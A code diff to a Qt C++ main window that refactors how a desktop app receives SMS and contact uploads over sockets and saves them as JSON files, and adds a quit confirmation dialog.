@@ -9,6 +9,7 @@
 #include <QTextStream>
 #include <QMessageBox>
 #include <QInputDialog>
+#include <QCloseEvent>
 #include "dialog/sendsmsdialog.h"
 
 MainWindow::MainWindow(QWidget *parent) :
@@ -26,9 +27,21 @@ MainWindow::~MainWindow()
     delete ui;
 }
 
+void MainWindow::closeEvent(QCloseEvent * event)
+{
+    if(QMessageBox::information(this,QString(" "),QString("Quit?"),QMessageBox::Yes,QMessageBox::No)!=QMessageBox::Yes)
+    {
+        event->ignore();
+    }
+    else
+    {
+        event->accept();
+    }
+}
+
 void MainWindow::init()
 {
-    QObject::connect(&mSessionManager,SIGNAL(onNewSession(NetworkSession*)),this,SLOT(handleNewSession(NetworkSession*)));
+    QObject::connect(&mSessionManager,SIGNAL(onNewSession(QString,QAbstractSocket*)),this,SLOT(handleNewSession(QString,QAbstractSocket*)));
 }
 
 void MainWindow::initView()
@@ -92,36 +105,49 @@ void MainWindow::handleServerStart()
     }
 }
 
-void MainWindow::handleNewSession(NetworkSession* networkSession)
+void MainWindow::handleNewSession(QString sessionName,QAbstractSocket* socket)
 {
-    QObject::connect(networkSession->socket(),SIGNAL(error(QAbstractSocket::SocketError)),networkSession,SLOT(deleteLater()));
-    QObject::connect(networkSession,SIGNAL(onReadData(NetworkSession*,QByteArray)),this,SLOT(handleReceiveData(NetworkSession*,QByteArray)));
-
-    // add extra data
-    if(networkSession->getSessionName()==ACTION_SEND_SMS)
+    if(sessionName==ACTION_SEND_SMS)
     {
-        networkSession->write(networkSession->getSessionData());
-        networkSession->deleteLater();
+        socket->deleteLater();
     }
-    else if(networkSession->getSessionName()==ACTION_UPLOAD_SMS || networkSession->getSessionName()==ACTION_UPLOAD_CONTACT)
+    else if(sessionName==ACTION_UPLOAD_SMS)
     {
-        QJsonObject jsonObject;
-        QJsonDocument jsonDocument;
-        jsonObject.insert(QString("action"), networkSession->getSessionName());
-        jsonDocument.setObject(jsonObject);
-        networkSession->write(jsonDocument.toJson());
+        DataPack* dataPack = new DataPack(socket);
+        QObject::connect(dataPack, SIGNAL(onReadData(DataPack*,QByteArray)), this, SLOT(saveSmsData(DataPack*,QByteArray)));
+        QObject::connect(socket, SIGNAL(destroyed()), dataPack, SLOT(deleteLater()));
+        QObject::connect(socket,SIGNAL(error(QAbstractSocket::SocketError)),socket,SLOT(deleteLater()));
+        QObject::connect(socket,SIGNAL(aboutToClose()),socket,SLOT(deleteLater()));
+    }
+    else if(sessionName==ACTION_UPLOAD_CONTACT)
+    {
+        DataPack* dataPack = new DataPack(socket);
+        QObject::connect(dataPack, SIGNAL(onReadData(DataPack*,QByteArray)), this, SLOT(saveContactData(DataPack*,QByteArray)));
+        QObject::connect(socket, SIGNAL(destroyed()), dataPack, SLOT(deleteLater()));
+        QObject::connect(socket,SIGNAL(error(QAbstractSocket::SocketError)),socket,SLOT(deleteLater()));
+        QObject::connect(socket,SIGNAL(aboutToClose()),socket,SLOT(deleteLater()));
     }
     else
     {
-        networkSession->deleteLater();
+        socket->deleteLater();
         return;
     }
 }
 
-void MainWindow::handleReceiveData(NetworkSession* networkSession, QByteArray data)
+void MainWindow::saveSmsData(DataPack* dataPack, QByteArray data)
+{
+    saveData(ACTION_UPLOAD_SMS, dataPack, data);
+}
+
+void MainWindow::saveContactData(DataPack* dataPack, QByteArray data)
+{
+    saveData(ACTION_UPLOAD_CONTACT, dataPack, data);
+}
+
+void MainWindow::saveData(QString sessionName, DataPack* dataPack, QByteArray data)
 {
     QJsonObject jsonObject = QJsonDocument::fromJson(data).object();
-    QJsonObject::iterator it = jsonObject.find(networkSession->getSessionName());
+    QJsonObject::iterator it = jsonObject.find(sessionName);
     if(it == jsonObject.end())
     {
         return;
@@ -129,14 +155,14 @@ void MainWindow::handleReceiveData(NetworkSession* networkSession, QByteArray da
     QJsonDocument jsonDocument;
     jsonDocument.setArray(it.value().toArray());
     QString fileName = QDateTime::currentDateTime().toString("yyyy-MM-dd_hh,mm,ss") + "_" + QUuid::createUuid().toString() + ".json";
-    QDir().mkpath(networkSession->getSessionName());
-    QFile file(networkSession->getSessionName() + "/" + fileName);
+    QDir().mkpath(sessionName);
+    QFile file(sessionName + "/" + fileName);
     file.open(QFile::WriteOnly|QFile::Text);
     QTextStream stream(&file);
     stream << jsonDocument.toJson();
     file.flush();
     file.close();
-    networkSession->deleteLater();
+    dataPack->socket()->close();
 }
 
 void MainWindow::sendSms()
@@ -151,7 +177,6 @@ void MainWindow::sendSms()
     {
         QJsonObject jsonObject;
         QJsonDocument jsonDocument;
-        jsonObject.insert(QString("action"), QString(ACTION_SEND_SMS));
         jsonObject.insert(QString("content"), sendSmsDialog.getContent());
         if(sendSmsDialog.isSendNumberList())
         {
